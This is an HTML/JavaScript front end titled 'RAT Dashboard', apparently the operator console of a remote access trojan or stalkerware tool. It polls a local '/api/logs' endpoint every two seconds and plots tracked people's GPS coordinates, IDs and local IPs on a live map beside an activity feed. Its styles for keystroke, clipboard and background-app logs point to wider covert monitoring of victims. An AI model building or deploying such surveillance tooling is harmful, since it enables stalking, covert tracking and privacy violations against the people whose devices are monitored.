<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <title>RAT Dashboard</title>
 <!-- Leaflet CSS -->
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
 body { margin: 0; background: #1a1a1a; color: #fff; font-family: monospace; display: flex; height: 100vh; }
 #map-container { flex: 2; position: relative; }
 #feed-container { flex: 1; padding: 20px; overflow-y: auto; border-left: 2px solid #333; background: #111; }
 .log-entry { margin-bottom: 10px; padding: 5px; border-bottom: 1px solid #333; font-size: 12px; }
 .key-log { color: #0f0; }
 .mouse-log { color: #0ff; }
 .marker-popup { font-size: 12px; }
 .badge { display: inline-block; padding: 2px 7px; border-radius: 10px; font-size: 0.68rem; margin: 2px 3px 2px 0; }
 .b-liar { background: #c0392b; }
 .b-together { background: #8e44ad; }
 .b-clipboard { background: #d35400; }
 .b-bgapp { background: #2980b9; }
 .b-zone { background: #27ae60; }
 </style>
</head>
<body>

<div id="map-container">
 <div id="map" style="height: 100%;"></div>
</div>

<div id="feed-container">
 <h3>📡 Live Activity</h3>
 <div id="logs"></div>
</div>

<script>
 // Initialize Map
 const map = L.map('map').setView([0, 0], 2);
 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
 attribution: '&copy; OpenStreetMap contributors'
 }).addTo(map);

 let markers = {};

 // Function to update UI
 function addLog(type, content) {
 const div = document.createElement('div');
 div.className = `log-entry ${type}-log`;
 div.textContent = `[${new Date().toLocaleTimeString()}] ${content}`;
 document.getElementById('logs').prepend(div);
 
 // Keep DOM light
 if (document.getElementById('logs').children.length > 50) {
 document.getElementById('logs').lastChild.remove();
 }
 }

 // Poll for updates every 2 seconds
 setInterval(async () => {
 try {
 const response = await fetch('/api/logs');
 const data = await response.json();
 
 // Clear existing markers to redraw fresh ones
 Object.values(markers).forEach(m => map.removeLayer(m));
 markers = {};

 data.forEach(log => {
 if (log.lat && log.lon) {
 const marker = L.marker([log.lat, log.lon]).addTo(map)
 .bindPopup(`<b>ID:</b> ${log.id}<br><b>IP:</b> ${log.local_ip || 'N/A'}<br><b>Time:</b> ${new Date(log.timestamp).toLocaleString()}`);
 markers[log.id] = marker;
 addLog('mouse', `User ${log.id} at (${log.lat.toFixed(4)}, ${log.lon.toFixed(4)})`);
 } else {
 addLog('key', `No GPS Data from ${log.id}`);
 }
 });
 } catch(e) {
 console.error("Fetch failed", e);
 }
 }, 2000);
</script>
</body>
</html>
